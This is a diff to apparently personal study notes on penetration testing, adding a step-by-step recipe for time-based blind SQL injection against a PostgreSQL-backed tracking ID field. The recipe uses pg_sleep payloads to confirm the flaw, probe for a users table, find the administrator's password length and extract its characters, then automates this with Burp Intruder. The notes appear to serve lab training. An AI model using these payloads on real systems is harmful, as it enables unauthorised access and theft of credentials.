@@ -203,7 +203,24 @@ sudo openvpn nmap -sV {target IP}
 - FROM:0 TO:20 STEP:1 then run a second set for the payload and set PAYLOAD to BRUTE FORCER MIN:1 MAX:1
 - check for the ones with different LENGTH value and write them out --SQL payload to bruteforce admin pass
 [+] check for the kinda sql used 
-- {'||pg_sleep(10)--} paste in tracking ID ( this is PSTGRE) -- testing for blind SQL injection using time based SQLi
+- {'||pg_sleep(10)--} paste in tracking ID ( this is PSTGRE) --testing for blind SQL injection using time based SQLi in tracking ID field
+- {'||(SELECT CASE WHEN (2=2) THEN pg_sleep(10) ELSE pg_sleep(0) END)--} paste this in tracking ID --conditional time based blind SQLi(PSTGRE)
+- try for both TRUE and FALSE statement to know if the website is vulnerable to blind SQL
+- if web app responds, try to select from users table {'||(SELECT CASE WHEN (2=2) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--}
+- to check if the above "users" table exists try ask for a false table e.g ("usersssss"), you'll find out by response time 
+- {'||(SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--}
+- use the above injection to check if there's an admin in the table and also test for the false e.g ("administratorgdgdg")
+- {'||(SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--}
+- use the above injection to check for password length, keep changing password length (>"number_here")
+- change the ">" to "=" in the above injection 
+- '||(SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
+- to guess passsword character, you can change position and letter if youe doing it manually 
+- on automation use INTRUDER and then add sign to the first "1" and the "a"
+- use CLUSTER BOMB attack and payload as NUMBERS, FROM:1 TO:20 STEPS:1
+- use BRUTE FORCER for next pane, because it's a time based SQL got to REQUEST POOL and change request max to 1
+- start attck, go to columns in RESULT and enable RESPONSE RECIEVED 
+- check for response time over 1000 
+- 
 
 
 
